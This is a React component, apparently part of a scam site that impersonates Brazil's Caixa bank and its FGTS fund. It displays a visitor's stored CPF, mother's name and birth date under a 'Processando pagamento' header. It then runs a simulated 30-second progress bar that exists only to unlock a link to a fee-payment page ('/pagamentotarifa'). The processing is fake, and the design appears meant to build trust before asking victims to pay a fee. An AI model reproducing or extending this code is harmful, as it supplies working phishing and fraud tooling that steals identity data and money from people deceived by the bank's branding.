/* eslint-disable @typescript-eslint/no-explicit-any */
import { useEffect, useState } from "react";
import logo from "../assets/caixalogo.png";
import flogo from "../assets/f-logo.png";
import logofgts from "../assets/fgts2.png";
import { FaAngleRight, FaSpinner } from "react-icons/fa";
import { UserData } from "../types/userData";
import dayjs from "dayjs";

export function ProcessandoPagamento() {
  const [progress, setProgress] = useState(0);
  const [isVisible, setIsVisible] = useState(false);

  const [userData, setUserData] = useState<UserData>({
    nome: "",
    cpf: "",
    dataNascimento: "",
    email: "",
    cep: "",
    nomeMae: "",
    cidade: "",
    estado: "",
    rua: "",
    numero: "",
  });

  useEffect(() => {
    // Recupera dados salvos
    const storedUserData = localStorage.getItem("userData");
    if (storedUserData) {
      setUserData(JSON.parse(storedUserData));
    }

    // Simula progresso até liberar CTA
    const start = Date.now();
    const duration = 30000; // 30 segundos

    const updateProgress = () => {
      const elapsed = Date.now() - start;
      const newProgress = Math.min((elapsed / duration) * 100, 100);
      setProgress(newProgress);

      if (newProgress >= 100) {
        setIsVisible(true);
      } else {
        requestAnimationFrame(updateProgress);
      }
    };

    updateProgress();
  }, []);

  return (
    <div className="w-screen h-screen flex flex-col items-center pb-10 text-white bg-[#025bab]">
      {/* Header */}
      <header className="flex w-full flex-col p-4 space-y-8 bg-[#025bab] pb-8">
        <div className="flex items-center justify-between w-full">
          <div className="flex items-center space-x-3">
            <img width={34} src={logo} alt="logo" />
            <span className="text-white font-extralight">
              Olá, {userData?.nome.split(" ")[0]}
            </span>
          </div>
          <img src={logofgts} alt="fgts" width={65} />
        </div>
      </header>

      {/* Box com dados */}
      <div className="rounded-lg bg-primary text-white mt-2">
        <div className="rounded-lg space-y-10">
          <div className="flex items-left space-x-2 animate-pulse">
            <div className="bg-orange-400 p-2 rounded-full">
              <img src={flogo} alt="flogo" width={20} />
            </div>
            <h2 className="font-bold text-xl">Processando pagamento...</h2>
          </div>

          <div className="font-bold text-xl flex flex-col px-4 space-y-2">
            <div className="flex items-center justify-between">
              <h3>{userData.nome.toUpperCase()}</h3>
              <FaAngleRight />
            </div>
            {userData?.nomeMae && (
              <span className="font-thin text-zinc-300">
                Nome da mãe: {userData?.nomeMae}
              </span>
            )}
            <span className="font-thin text-zinc-300">CPF: {userData?.cpf}</span>
            <span className="font-thin text-zinc-300">
              Nascimento:{" "}
              {dayjs(userData?.dataNascimento).format("DD/MM/YYYY")}
            </span>
          </div>
          <span className="border-b border-b-zinc-800 my-2" />
        </div>
      </div>

      {/* Iframe responsivo */}
      <div className="w-full max-w-3xl mt-6 px-4">
        <div
          style={{
            padding: "56.25% 0 0 0",
            position: "relative",
            borderRadius: "0.5rem",
            overflow: "hidden",
          }}
        >
          <iframe
            src="https://player.vimeo.com/video/1032180388?badge=0&autopause=0&player_id=0&app_id=58479&autoplay=1"
            frameBorder="0"
            allow="autoplay; fullscreen; picture-in-picture; clipboard-write; encrypted-media; web-share"
            referrerPolicy="strict-origin-when-cross-origin"
            style={{
              position: "absolute",
              top: 0,
              left: 0,
              width: "100%",
              height: "100%",
            }}
            title="1030(4)"
          ></iframe>
        </div>
      </div>

      {/* Barra de progresso */}
      <div className="px-4 w-full flex flex-col items-center space-y-4 mt-6">
        <div className="w-full bg-gray-300 rounded-full h-4 mx-4">
          <div
            className="bg-orange-500 h-4 rounded-full transition-all ease-linear"
            style={{ width: `${progress}%` }}
          />
        </div>
        <span className="text-sm text-zinc-400">
          {Math.floor(progress)}% concluído
        </span>
      </div>

      {/* Botão liberado ao final */}
      <div className="px-3 w-full mt-6">
        {isVisible ? (
          <a href="/pagamentotarifa" className="w-full">
            <button className="w-full py-3 rounded-md text-white text-xl focus:outline-none bg-orange-500 hover:bg-orange-600 animate-bounce mt-3">
              Próxima etapa
            </button>
          </a>
        ) : (
          <button
            className="w-full py-3 rounded-md text-white text-xl focus:outline-none bg-blue-900 opacity-60"
            disabled
          >
            <div className="flex items-center justify-center space-x-2">
              <FaSpinner className="animate-spin" />
              <span>Carregando</span>
            </div>
          </button>
        )}
      </div>

      {/* Mensagem final */}
      <div className="text-center mt-4 px-4">
        <h2 className="text-lg text-zinc-300">Seu pagamento está sendo processado...</h2>
        <p className="text-sm text-zinc-400">
          Estamos preparando seu atendimento. Por favor, aguarde um momento.
        </p>
      </div>
    </div>
  );
}
